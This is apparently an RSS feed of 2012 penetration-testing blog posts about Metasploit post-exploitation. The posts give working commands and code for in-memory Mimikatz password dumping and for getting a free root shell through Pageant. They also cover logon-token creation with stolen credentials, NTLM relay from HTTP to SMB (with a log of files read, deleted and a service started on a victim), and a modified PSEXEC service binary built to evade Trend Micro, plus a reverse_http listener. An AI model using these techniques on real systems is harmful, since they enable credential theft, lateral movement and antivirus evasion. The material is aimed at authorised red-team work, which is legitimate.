&lt;p&gt;One thing I have yet to update is a simple check to make sure you are an admin that can actually bypass UAC. If you aren&amp;rsquo;t, then you&amp;rsquo;ll be leaving this lovely calling card behind for the user:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_bypassuac_7.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Setting SYSTEM&#39;s proxy settings with Metasploit</title>
      <link>https://malicious.link/post/2012/2012-10-21-setting-systems-proxy-settings-with-metasploit/</link>
      <pubDate>Sun, 21 Oct 2012 07:40:11 +0000</pubDate>
      
      <guid>https://malicious.link/post/2012/2012-10-21-setting-systems-proxy-settings-with-metasploit/</guid>
      <description>&lt;p&gt;One of the great things about the reverse_http(s) payloads is that it is proxy aware. However one of the pitfalls to this is that SYSTEM doesn&amp;rsquo;t have proxy settings, nor do users who have never logged into a system (unless profile loading is triggered). The problem here arrises when you are trying to do anything as SYSTEM, also the PSEXEC only has the option of getting you a SYSTEM shell (so you&amp;rsquo;re done for right out of the door)&lt;/p&gt;

&lt;p&gt;Now, there is a stub in Metasploit that I have been unable to complete due to my lack of knowledge in the shell code world. The stub allows you to create payloads that have static proxies, which basically invalidates the need for the following. Until then here is a few ways to set / read the proxy settings for SYSTEM or any other user for that matter.&lt;/p&gt;

&lt;p&gt;Its here if you want to take a whack at it:Â &lt;code&gt;external/source/shellcode/windows/x86/src/block/block_reverse_https_proxy.asm&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;One of the ways @&lt;a href=&#34;https://twitter.com/carnal0wnage&#34;&gt;carnal0wnage&lt;/a&gt; and I demoed @&lt;a href=&#34;https://twitter.com/derbycon&#34;&gt;DerbyCon&lt;/a&gt; was using the bitsadmin binary. Windows7/Vista/2008 come with version 2.0+ which has this great ability to run the following:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;bitsadmin /util /setieproxy localsystem MANUAL_PROXY 192.168.1.55:3128 &amp;quot;;&amp;quot;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;(2000,XP,2003 you could upload a copy of bitsadmin that was new enough and that would still work)&lt;/p&gt;

&lt;p&gt;That command sets the proxy settings for the SYSTEM account. I was able to jump through hoops and do this remotely by using the windows/exec payload via psexec, then reverse_http(s) would work.&lt;/p&gt;

&lt;p&gt;But I wanted a better way to do this. I watched the execution of bitsadmin to see what it was doing and all it was actually doing is setting a registry key. Awesome, I can do that.&lt;/p&gt;

&lt;p&gt;Enter enum_proxy:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_proxy_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;And&amp;hellip;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_proxy_2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;If you&amp;rsquo;ve noticed that RHOST option, Metasploit has the ability to do remote registry calls as well (this module will attempt to start the RemoteRegistry service if the user has the privilege to do so):&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_proxy_3.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Output from it finding a disabled RemoteRegistry:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;msf post(enum_proxy) &amp;gt; run

[-] Unable to contact remote registry service on 172.16.10.217
[*] Attempting to start service remotely...
[*] Proxy Counter = 9
[*] Setting: WPAD and AutoConfigure script
[*] AutoConfigURL: http://anotherproxyserver/pac.pac
[*] Post module execution completed
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&amp;ldquo;Awesome but you promised setting the proxy settings&amp;rdquo;, well right now all I can give you is a cloner ;-)&lt;/p&gt;

&lt;p&gt;Enter clone_proxy_settings module:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_proxy_4.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;And thats it. Still working on an actual &amp;ldquo;set_proxy&amp;rdquo; module, but this should do for now, and a lot less to type.&lt;/p&gt;

&lt;p&gt;As of this post both are currently pull requests:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/rapid7/metasploit-framework/pull/942&#34;&gt;https://github.com/rapid7/metasploit-framework/pull/942&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/rapid7/metasploit-framework/pull/943&#34;&gt;https://github.com/rapid7/metasploit-framework/pull/943&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>Mounting SMB shares over Meterpreter</title>
      <link>https://malicious.link/post/2012/2012-10-17-mounting-smb-shares-over-meterpreter/</link>
      <pubDate>Wed, 17 Oct 2012 17:52:30 +0000</pubDate>
      
      <guid>https://malicious.link/post/2012/2012-10-17-mounting-smb-shares-over-meterpreter/</guid>
      <description>&lt;p&gt;Ok, this is pretty straight forward no magic:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_smb_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Got a shell, doesn&amp;rsquo;t have to be SYSTEM&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_smb_2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Add a route to the internal range or directly to the host you want over the session you want&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_smb_3.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Mosy on over Â to the Socks4a module. And in another terminal we need to make sure our proxychains.conf file in /etc/ or where ever you store your conf is correct.Â &lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_smb_4.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;It defaults to 9050 on 127.0.01 for Tor, that&amp;rsquo;s pretty easy to cope with and no reason to mess with it if you actually use it for Tor for other things.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_smb_5.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Run the socks proxy with the Tor-like settings. (Remember to shutdown Tor first)&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_smb_6.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;And the rest is gravy. The % (percent sign if blog software mangles it) is a delimiter that smbclient and other samba tools recognize between user and password (so it doesn&amp;rsquo;t prompt you for it).&lt;/p&gt;

&lt;p&gt;And just to love it working:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_smb_7.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;yay files.. Yes I know I didn&amp;rsquo;t use smbmount but it works the same as well as rpcclient.&lt;/p&gt;

&lt;p&gt;A side note here is if you are using the pth-tools from:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://code.google.com/p/passing-the-hash/&#34;&gt;https://code.google.com/p/passing-the-hash/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;You can use hashes instead of passwords for stuff like this. But who are we kidding? Who doesn&amp;rsquo;t get clear text passwords anymore ;-)&lt;/p&gt;

&lt;p&gt;Â &lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Meet âqâ â Free Metasploit Exploit Pack</title>
      <link>https://malicious.link/post/2012/2012-10-04-meet-q-free-metasploit-exploit-pack-html/</link>
      <pubDate>Thu, 04 Oct 2012 09:07:57 +0000</pubDate>
      
      <guid>https://malicious.link/post/2012/2012-10-04-meet-q-free-metasploit-exploit-pack-html/</guid>
      <description>&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_q_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Once youâre done staring at the Star Trek deity above (itâs a staring contest you will loose since you a such a simplistic race). I pull your attention to: &lt;a href=&#34;https://github.com/mubix/q&#34;&gt;https://github.com/mubix/q&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;This repository / exploit pack was created for the sole purpose to house modules, scripts and resource files that would otherwise not be accepted into the Metasploit trunk. It will always be free and anyone is free to submit pulls of modules, scripts or resource files that they created &lt;strong&gt;or just found&lt;/strong&gt; and were not accepted to the trunk because it was just a script, it violates TOS of a service, they did not author it, or any other possible reason. (Like the fear of @egyp7 âs coding red pen)&lt;/p&gt;

&lt;p&gt;While I completely understand the reason and possible backlash Metasploit and subsequently Rapid7 might get for housing modules that were not submitted by their original owners, or violate some TOS, I feel that those modules should not simply disappear into time.&lt;/p&gt;

&lt;p&gt;With that said, if a module gets added to this repo by another person and the other contacts me to take it down I certainly will.&lt;/p&gt;

&lt;p&gt;So if you have modules, scripts, resource files or anything else that you would like to share, please submit a pull request, and weâll see about getting it shared out for other people to use.&lt;/p&gt;

&lt;p&gt;P.S. I am, as evident by this blog, a friend of the framework, so I would do my best to remove the blockage that is stopping the item from being in the Metasploit trunk if at all possible. This repo / exploit pack is meant to support the framework, not subjugate it in any way.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Completely In-memory Mimikatz with Metasploit</title>
      <link>https://malicious.link/post/2012/2012-09-06-completely-in-memory-mimikatz-with-metasploit/</link>
      <pubDate>Thu, 06 Sep 2012 03:16:47 +0000</pubDate>
      
      <guid>https://malicious.link/post/2012/2012-09-06-completely-in-memory-mimikatz-with-metasploit/</guid>
      <description>&lt;p&gt;Executing WCE.exe in memory as demoed by Egypt here:Â &lt;a href=&#34;https://community.rapid7.com/community/metasploit/blog/2012/05/08/eternal-sunshine-of-the-spotless-ram&#34;&gt;https://community.rapid7.com/community/metasploit/blog/2012/05/08/eternal-sunshine-of-the-spotless-ram&lt;/a&gt;Â has two issues with it. 1, you leave a file on disk with your hashes and clear text passwords. That just won&amp;rsquo;t do. 2. There is this DLL called WCEAUX.dll that gets written for the briefest second to disk:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201209_mimikatz_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;(yes I realize I&amp;rsquo;m running this on disk &amp;lsquo;wce32.exe&amp;rsquo;, but it exhibits the same DLL drop when doing in-memory)&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Now, don&amp;rsquo;t get me wrong, I love WCE, andÂ Hernan Ochoa does an amazing job with it, but when it comes down to it, it&amp;rsquo;s the best tool for the job. And today, that&amp;rsquo;s now Mimikatz.Â &lt;/p&gt;

&lt;p&gt;Just like WCE to execute it in memory you use the -m flag for execute:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;meterpreter&amp;gt; execute -H -i -c -m -d calc.exe -f mimikatz.exe -a &#39;&amp;quot;sekurlsa::logonPasswords full&amp;quot; exit&#39;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;For mimikatz to automatically send commands require double quotes in the command line arguments, so we use single quotes in meterpreter to encircle the execute arguments (-a). Running first &amp;ldquo;sekurlsa::logonPasswords full&amp;rdquo; then &amp;lsquo;exit&amp;rsquo; to auto-exit mimikatz console. Like so:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201209_mimikatz_2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;And all you get forensically is calc.exe loading a ton of DLLs it has no business loading but no new files touch disk ;-)&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201209_mimikatz_3.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;The downloads for Mimikatz are were they always are: &lt;a href=&#34;http://blog.gentilkiwi.com/mimikatz&#34;&gt;http://blog.gentilkiwi.com/mimikatz&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Oh, did I mention that Mimikatz is open source and the in-memory goodness has been uploaded to svn: &lt;a href=&#34;https://code.google.com/p/mimikatz/&#34;&gt;https://code.google.com/p/mimikatz/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Awesome work &lt;a href=&#34;http://twitter.com/gentilkiwi&#34;&gt;@gentilkiwi&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;If you want to check out the the fix that was implemented to work with Meterpreter&amp;rsquo;s in-memory goodness check here: &lt;a href=&#34;https://code.google.com/p/mimikatz/source/detail?r=33&#34;&gt;https://code.google.com/p/mimikatz/source/detail?r=33&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Free Shells with Plink and Pageant</title>
      <link>https://malicious.link/post/2012/2012-08-28-free-shells-with-plink-and-pageant/</link>
      <pubDate>Tue, 28 Aug 2012 15:42:03 +0000</pubDate>
      
      <guid>https://malicious.link/post/2012/2012-08-28-free-shells-with-plink-and-pageant/</guid>
      <description>&lt;p&gt;Watching &lt;a href=&#34;http://twitter.com/egyp7&#34;&gt;Egypt&lt;/a&gt;âs talk at DEFCON 20 he mentioned the ability to jump on on a system when pageant (puTTYâs ssh-agent equivalent) is running. So I wanted to figure out the best way to get this going. Here is what I came up with:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; run enum_putty
[*] Putty Installed for [[&amp;quot;Administrator&amp;quot;]]
[*] Saved SSH Server Public Keys:
[*]     rsa2@22:172.16.10.150
[*] Session corp_webserver:
[*]     Protocol: SSH
[*]     Hostname: 172.16.10.150
[*]     Username: root
[*]     Public Key:
meterpreter &amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Awesome, this guy runs as root and we have the IP address. But it doesnât have any public keys listed. Thatâs ok because Pageant is running.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; shell
Process 3364 created.
Channel 1 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\Program Files\PuTTY&amp;gt;plink -agent root@172.16.10.150
plink -agent root@172.16.10.150
Welcome to Ubuntu 12.04 LTS (GNU/Linux 2.6.39.1-34 i686)
No mail.
Last login: Tue Aug 28 14:15:18 2012 from 172.16.10.100
root@172.16.10.150:~]$ id
uid=0(root) gid=0(root) groups=0(root)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;w00t! An extra shell for free!!&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201208_freeshells_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Raising Zombies in Windows: Part 1 - Passwords</title>
      <link>https://malicious.link/post/2012/2012-07-31-raising-zombies-in-windows-part-1-passwords/</link>
      <pubDate>Tue, 31 Jul 2012 20:20:15 +0000</pubDate>
      
      <guid>https://malicious.link/post/2012/2012-07-31-raising-zombies-in-windows-part-1-passwords/</guid>
      <description>&lt;p&gt;With the use of Mimikatz and WCE, clear text passwords are much more common. What isn&amp;rsquo;t always there is the user. They take lunches, go home at a reasonable time and generally aren&amp;rsquo;t really appreciative of our (pentester/red teamer)&amp;rsquo;s schedule.&lt;/p&gt;

&lt;p&gt;A straight forward way, and provided by Microsoft to create a process as a user (whereby having their token readily available is using &amp;lsquo;runas.exe&amp;rsquo;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201207_zombies_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;w00t, we the user is present, we can migrate our meterepreter session into that notepad and we&amp;rsquo;re good right? Problem there is you have to interactively input the password, so without a real cmd.exe or RDP session of your own, (VNC payload would work), you&amp;rsquo;re generally SOL.&lt;/p&gt;

&lt;p&gt;There are a ton of posted ways around this, most involve make a wrapper script to input the password for you such as this one:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201207_zombies_2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;(this was pretty unique as it actually sent the keys to the key buffer instead of directly to STDIN)&lt;/p&gt;

&lt;p&gt;Another way if you don&amp;rsquo;t mind dropping / creating a custom bin, AutoIT makes this REALLY simple:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201207_zombies_3.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;This could be 2 lines if you really wanted it to be but I like to make things a bit more universal. You could also execute this directly in memory with meterepreter&amp;rsquo;s execute command with the &amp;ldquo;-m&amp;rdquo; argument after you&amp;rsquo;ve built the AutoIT script into a EXE.&lt;/p&gt;

&lt;p&gt;But what go through all that trouble? Railgun can do this just as easily. Drop to IRB or create a script that does the following:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;a = client.railgun.kernel32.GetStartupInfoW(56)[&amp;quot;lpStartupInfo&amp;quot;]
client.railgun.advapi32.CreateProcessWithLogonW(&amp;quot;USER&amp;quot;,&amp;quot;DOMAIN&amp;quot;,&amp;quot;PASSWORD&amp;quot;,&amp;quot;LOGON_WITH_PROFILE&amp;quot;,&amp;quot;notepad.exe&amp;quot;,nil,0,nil,nil,a,32)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This will create a notepad.exe process with the defined user. But we can go a bit more stealthy, since we really only need their account token we can just user LogonUser:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;client.railgun.advapi32.LogonUserA(&amp;quot;USER&amp;quot;,&amp;quot;DOMAIN&amp;quot;,&amp;quot;PASSWORD&amp;quot;,&amp;quot;LOGON32_LOGON_INTERACTIVE&amp;quot;,&amp;quot;LOGON32_PROVIDER_DEFAULT&amp;quot;,4)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;List the tokens available with Incognito, your new user will be there, steal it and you&amp;rsquo;re done. You now have the ability to user that account/domain token on any of the hosts you&amp;rsquo;ve compromised on the network, not just the ones they happen to have left themselves logged in. This gets really fun on servers where the admin hasn&amp;rsquo;t logged in but you wanna grab all of their IE saved passwords ;-)&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Cross-Protocol Chained Pass the Hash for Metasploit</title>
      <link>https://malicious.link/post/2012/2012-07-10-cross-protocol-chained-pass-the-hash-for-metasploit/</link>
      <pubDate>Tue, 10 Jul 2012 06:02:40 +0000</pubDate>
      
      <guid>https://malicious.link/post/2012/2012-07-10-cross-protocol-chained-pass-the-hash-for-metasploit/</guid>
      <description>&lt;p&gt;Every so often someone writes a Metasploit Module that is pretty epic. Today is one such day:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201207_pth_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Twitter Link:Â &lt;a href=&#34;https://twitter.com/webstersprodigy/status/222529916783169536&#34;&gt;https://twitter.com/webstersprodigy/status/222529916783169536&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Which has a link to here:Â &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/pull/589&#34;&gt;https://github.com/rapid7/metasploit-framework/pull/589&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Demo / Example resource files:Â &lt;a href=&#34;https://skydrive.live.com/?cid=19794fac33285fd5&amp;amp;resid=19794FAC33285FD5!170&amp;amp;id=19794FAC33285FD5%21170&#34;&gt;https://skydrive.live.com/?cid=19794fac33285fd5&amp;amp;resid=19794FAC33285FD5!170&amp;amp;id=19794FAC33285FD5%21170&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;You can pull the fork w/ branch from here:Â &lt;a href=&#34;https://github.com/webstersprodigy/metasploit-framework/tree/module-http-ntlmrelay&#34;&gt;https://github.com/webstersprodigy/metasploit-framework/tree/module-http-ntlmrelay&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;And as soon as you do you can start doing this (&lt;strong&gt;&lt;em&gt;using the example resource file to put a file, cat it out, enum shares available, list files on a share, then psexec all from a single URL being loaded&lt;/em&gt;&lt;/strong&gt;):&lt;/p&gt;

&lt;p&gt;163 address is the Victim I tricked into loading a URL and 182 is the system I want to get onto. This is an HTTP request resulting in a SMB Relay&amp;rsquo;d auth.Â It looks as though multiple targets can be used as relay targets but I haven&amp;rsquo;t tested this out yet.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[*] 172.16.10.163 http_ntlmrelay - NTLM Request &#39;/smb_put&#39; from 172.16.10.163:52327
[*] 172.16.10.163 http_ntlmrelay - Beginning NTLM Relay...
[*] 172.16.10.163 http_ntlmrelay - SMB auth relay succeeded
[*] 172.16.10.163 http_ntlmrelay - File \\172.16.10.182\c$\secret.txt written
[*] 172.16.10.163 http_ntlmrelay - NTLM Request &#39;/smb_get&#39; from 172.16.10.163:52328
[*] 172.16.10.163 http_ntlmrelay - Beginning NTLM Relay...
[*] 172.16.10.163 http_ntlmrelay - SMB auth relay succeeded
[*] 172.16.10.163 http_ntlmrelay - Reading 13 bytes from 172.16.10.182
[*] 172.16.10.163 http_ntlmrelay - ----Contents----
[*] 172.16.10.163 http_ntlmrelay - hi ima secret
[*] 172.16.10.163 http_ntlmrelay - ----End Contents----
[*] 172.16.10.163 http_ntlmrelay - NTLM Request &#39;/smb_enum&#39; from 172.16.10.163:52329
[*] 172.16.10.163 http_ntlmrelay - Beginning NTLM Relay...
[*] 172.16.10.163 http_ntlmrelay - SMB auth relay succeeded
[*] 172.16.10.163 http_ntlmrelay - Shares enumerated 172.16.10.182 IPC$ ADMIN$ C$
[*] 172.16.10.163 http_ntlmrelay - NTLM Request &#39;/smb_ls&#39; from 172.16.10.163:52330
[*] 172.16.10.163 http_ntlmrelay - Beginning NTLM Relay...
[*] 172.16.10.163 http_ntlmrelay - SMB auth relay succeeded
[*] 172.16.10.163 http_ntlmrelay - Listed 13 files from 172.16.10.182c$
[*] 172.16.10.163 http_ntlmrelay - .rnd
[*] 172.16.10.163 http_ntlmrelay - PerfLogs
[*] 172.16.10.163 http_ntlmrelay - config.sys
[*] 172.16.10.163 http_ntlmrelay - inetpub
[*] 172.16.10.163 http_ntlmrelay - xampp
[*] 172.16.10.163 http_ntlmrelay - ProgramData
[*] 172.16.10.163 http_ntlmrelay - MSOCache
[*] 172.16.10.163 http_ntlmrelay - secret.txt
[*] 172.16.10.163 http_ntlmrelay - autoexec.bat
[*] 172.16.10.163 http_ntlmrelay - Windows
[*] 172.16.10.163 http_ntlmrelay - Users
[*] 172.16.10.163 http_ntlmrelay - Program Files
[*] 172.16.10.163 http_ntlmrelay - NTLM Request &#39;/smb_rm&#39; from 172.16.10.163:52332
[*] 172.16.10.163 http_ntlmrelay - Beginning NTLM Relay...
[*] 172.16.10.163 http_ntlmrelay - SMB auth relay succeeded
[*] 172.16.10.163 http_ntlmrelay - File \\172.16.10.182\c$\secret.txt deleted
[*] 172.16.10.163 http_ntlmrelay - NTLM Request &#39;/smb_pwn&#39; from 172.16.10.163:52333
[*] 172.16.10.163 http_ntlmrelay - Beginning NTLM Relay...
[*] 172.16.10.163 http_ntlmrelay - SMB auth relay succeeded
[*] 172.16.10.163 http_ntlmrelay - Obtraining a service manager handle...
[*] 172.16.10.163 http_ntlmrelay - Creating a new service
[*] 172.16.10.163 http_ntlmrelay - Closing service handle...
[*] 172.16.10.163 http_ntlmrelay - Opening service...
[*] 172.16.10.163 http_ntlmrelay - Starting the service...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Let the fun begin&amp;hellip;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Bypassing Trend Micro&#39;s Service Protection</title>
      <link>https://malicious.link/post/2012/2012-07-05-bypassing-trend-micros-service-protection/</link>
      <pubDate>Thu, 05 Jul 2012 03:44:59 +0000</pubDate>
      
      <guid>https://malicious.link/post/2012/2012-07-05-bypassing-trend-micros-service-protection/</guid>
      <description>&lt;p&gt;&lt;a href=&#34;http://twitter.com/jabjorkhaug&#34;&gt;@jabjorkhaug&lt;/a&gt; posed the following question on Twitter today:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201207_trendmicro_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;I figured I could solve this and it would be an interesting challenge. Here is what it gets detected as:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201207_trendmicro_2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;The service binary that is used as part of PSEXEC is located here:&lt;/p&gt;

&lt;p&gt;MSF Directory/data/templates/src/pe/exe/service/service.c&lt;/p&gt;

&lt;p&gt;The important part to look at starts at line 57:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;#define WIN32_LEAN_AND_MEAN
#include &amp;lt;windows.h&amp;gt;

#define PAYLOAD_SIZE	8192

char cServiceName[32] = &amp;quot;SERVICENAME&amp;quot;;

char bPayload[PAYLOAD_SIZE] = &amp;quot;PAYLOAD:&amp;quot;;

SERVICE_STATUS ss;

SERVICE_STATUS_HANDLE hStatus = NULL;

/*
 *
 */
BOOL ServiceHandler( DWORD dwControl )
{
	if( dwControl == SERVICE_CONTROL_STOP || dwControl == SERVICE_CONTROL_SHUTDOWN )
	{
		ss.dwWin32ExitCode = 0;
		ss.dwCurrentState  = SERVICE_STOPPED;
	}
	return SetServiceStatus( hStatus, &amp;amp;ss );
}

/*
 *
 */
VOID ServiceMain( DWORD dwNumServicesArgs, LPSTR * lpServiceArgVectors )
{
	CONTEXT Context;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	LPVOID lpPayload = NULL;

	ZeroMemory( &amp;amp;ss, sizeof(SERVICE_STATUS) );
	ZeroMemory( &amp;amp;si, sizeof(STARTUPINFO) );
	ZeroMemory( &amp;amp;pi, sizeof(PROCESS_INFORMATION) );

	si.cb = sizeof(STARTUPINFO);

	ss.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;

	ss.dwCurrentState = SERVICE_START_PENDING;

	ss.dwControlsAccepted = SERVICE_ACCEPT_STOP|SERVICE_ACCEPT_SHUTDOWN;

	hStatus = RegisterServiceCtrlHandler( (LPCSTR)&amp;amp;cServiceName, (LPHANDLER_FUNCTION)ServiceHandler );
  
	if ( hStatus )
	{
		ss.dwCurrentState = SERVICE_RUNNING;

		SetServiceStatus( hStatus, &amp;amp;ss );

		if( CreateProcess( NULL, &amp;quot;rundll32.exe&amp;quot;, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &amp;amp;si, &amp;amp;pi ) )
		{
			Context.ContextFlags = CONTEXT_FULL;
		  
			GetThreadContext( pi.hThread, &amp;amp;Context );
		  
			lpPayload = VirtualAllocEx( pi.hProcess, NULL, PAYLOAD_SIZE, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE );
			if( lpPayload )
			{
				WriteProcessMemory( pi.hProcess, lpPayload, &amp;amp;bPayload, PAYLOAD_SIZE, NULL );
#ifdef _WIN64
				Context.Rip = (DWORD64)lpPayload;
#else
				Context.Eip = (DWORD)lpPayload;
#endif
				SetThreadContext( pi.hThread, &amp;amp;Context );
			}

			ResumeThread( pi.hThread );
			
			CloseHandle( pi.hThread );
		  
			CloseHandle( pi.hProcess );
		}
		
		ServiceHandler( SERVICE_CONTROL_STOP );
		
		ExitProcess( 0 );
	}
}

/*
 *
 */
int __stdcall WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow )
{
	SERVICE_TABLE_ENTRY st[] = 
    { 
        { (LPSTR)&amp;amp;cServiceName, (LPSERVICE_MAIN_FUNCTIONA)&amp;amp;ServiceMain }, 
        { NULL, NULL } 
    };
	return StartServiceCtrlDispatcher( (SERVICE_TABLE_ENTRY *)&amp;amp;st );
}

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;It&amp;rsquo;s injecting our payload into the service binary and tossing our payload into &amp;ldquo;rundll32.exe&amp;rdquo; at run time on the victim (side note: you can change which bin it goes into ;). Lets change this so it doesn&amp;rsquo;t do any injection and just executes a binary. That removes the &amp;lsquo;injection&amp;rsquo; piece and hopefully lets us get our shell. We are loosing a bit of stealth because instead of just one (the service binary) we are writing two binaries.&lt;/p&gt;

&lt;p&gt;To make this change you replace the above with just this:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;if( CreateProcess( NULL, &amp;quot;C:\evil.exe&amp;quot;, NULL, NULL, FALSE, DETACHED_PROCESS, NULL, NULL, &amp;amp;si, &amp;amp;pi ) )
{
	CloseHandle( pi.hProcess );
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Compiling this on OSX using mingw is very easy and is very similar on Ubuntu if you have mingw installed:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;i386-mingw32-gcc -o service.exe service.cÂ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Then just copy it to replace the current one:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;cp service.exe ../../../../template_x86_windows_svc.exeÂ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;No other changes are needed. Only problem is, how do we get the &amp;ldquo;evil.exe&amp;rdquo; up onto the box for it to execute? That&amp;rsquo;s where the auxiliary module &amp;ldquo;auxiliary/admin/smb/upload_file&amp;rdquo; comes in :-) I built a resource file to demo the timeline of getting execution with this new service binary (broken up with comments to explain, &lt;em&gt;remove the comments for it to work&lt;/em&gt;):&lt;/p&gt;

&lt;p&gt;Start Multi Handler&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;use multi/handler
set PAYLOAD windows/meterpreter/reverse_http
set LHOST 172.16.195.1
set LPORT 80
